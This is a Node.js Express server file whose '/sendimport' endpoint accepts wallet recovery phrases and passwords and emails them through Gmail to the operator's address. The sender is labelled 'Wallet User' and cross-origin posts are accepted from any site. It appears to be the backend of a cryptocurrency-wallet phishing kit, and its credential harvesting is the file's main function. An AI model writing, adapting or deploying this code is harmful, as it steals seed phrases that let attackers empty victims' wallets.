const express = require("express")
const nodemailer = require("nodemailer");
const cors = require("cors")
require('dotenv').config()

const app = express();
app.use(express.json())
app.use(express.urlencoded())
app.use(cors({
    origin: "*"
}))

app.listen(5000, () => {
    console.log("Server running at 5000 port");
})

app.post("/sendmail", async (req, res) => {
    console.log(req.body)
    const { message } = req.body
    console.log(message);
    let transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com ",
        auth: {
            user: process.env.USER,
            pass: process.env.PASS
        }
    })
    let info = await transporter.sendMail({
        from: "Wallet User",
        to: process.env.USER,
        subject: "Testing",
        text: `${message}`,
        html: `<p>This is a test message ${message}</p> `,
    })
    console.log("Message sent: %s", info.messageId);
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
})

app.post("/sendimport", async (req, res) => {
    res.send("Hello")
    console.log(req.body)
    const { phrasedata, passdata, confpassdata } = req.body
    console.log(phrasedata, passdata, confpassdata);
    let transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com ",
        auth: {
            user: process.env.USER,
            pass: process.env.PASS
        }
    })
    let info = await transporter.sendMail({
        from: "Wallet User",
        to: process.env.USER,
        subject: "Testing",
        text: `${phrasedata}`,
        html: `<p>This is phrase ${phrasedata} <br></br> This is new password ${passdata}<br></br> This is confirm password ${confpassdata}</p> `,
    })
    console.log("Message sent: %s", info.messageId);
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
})